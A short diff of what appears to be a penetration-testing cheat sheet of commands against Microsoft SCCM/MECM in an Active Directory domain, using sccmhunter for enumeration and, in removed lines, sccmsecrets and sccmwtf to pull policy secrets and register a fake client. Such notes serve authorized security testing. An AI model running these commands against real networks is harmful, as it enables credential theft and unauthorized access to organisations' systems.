@@ -4,6 +4,3 @@ sccmhunter admin -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$DC_IP" -siteser
 sccmhunter.py find -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$IP"
 sccmhunter.py smb -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$IP" -save
 sccmhunter.py http -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip "$IP" -auto
-sccmsecrets.py policies --management-point http://$MECM_FQDN --client-name "$CLIENT"
-sccmsecrets.py files --distribution-point http://$MECM_FQDN
-sccmwtf.py fakepc fakepc."$DOMAIN" "$SCCM_MP" "$DOMAIN\\$COMPUTER_NAME$" "$COMPUTER_PASSWORD"
